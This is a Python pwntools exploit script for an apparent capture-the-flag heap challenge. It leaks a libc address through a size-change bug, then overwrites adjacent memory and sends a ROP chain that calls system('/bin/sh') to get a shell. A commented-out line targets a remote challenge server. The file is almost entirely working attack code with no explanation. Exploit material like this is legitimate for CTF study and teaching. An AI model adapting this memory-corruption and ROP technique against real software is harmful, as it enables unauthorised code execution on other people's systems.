from pwn import *

elf = ELF('./chall_patched')
libc = ELF('./libc.so.6')
p = elf.process()
# p = remote('34.143.130.87', 4096)

def add(idx, size, data):
	p.sendlineafter(b'choice : ', b'1')
	p.sendlineafter(b': ', str(idx).encode())
	p.sendlineafter(b': ', str(size).encode())
	p.sendafter(b': ', data)

def show(idx):
	p.sendlineafter(b'choice : ', b'3')
	p.sendlineafter(b'? ', str(idx).encode())

def edit(idx, data):
	p.sendlineafter(b'choice : ', b'2')
	p.sendlineafter(b': ', str(idx).encode())
	p.sendafter(b': ', data)

def delete(idx):
	p.sendlineafter(b'choice : ', b'4')
	p.sendlineafter(b': ', str(idx).encode())

def change_size(idx, size):
	p.sendlineafter(b'choice : ', b'1')
	p.sendlineafter(b': ', str(idx).encode())
	p.sendlineafter(b': ', str(size).encode())

add(0, 1, b'a')

change_size(0, 0x3000)
delete(0)

add(0, 0x2000, b'a'*0x2000)

change_size(0, 0x2018)
edit(0, b'a'*0x2018)

show(0)

libc.address = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['_dl_catch_exception']
print(hex(libc.address))

pop_rdi = libc.address + 0x2a3e5
system = libc.sym['system']
bin_sh = next(libc.search(b'/bin/sh'))

add(1, 0x2000, b'a'*0x2000)
change_size(1, 0x2800)

payload = b'a'*0x26b0
payload += p64(libc.address + 0x21a580)
payload = payload.ljust(0x2750, b'a')
payload += p64(libc.address - 0x28c0)
payload += b'a'*0x20 + b'\n'

gdb.attach(p, 'b*main+47\nb*delete+57\nb*add+469\nb*show+213\nb*delete+216\nb*add+312\nb*edit+233')
edit(1, payload)

payload = b'a'*0x18
payload += b'a'*8
payload += b'a'*8
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(pop_rdi + 1)
payload += p64(system)

p.sendline(payload)

p.interactive()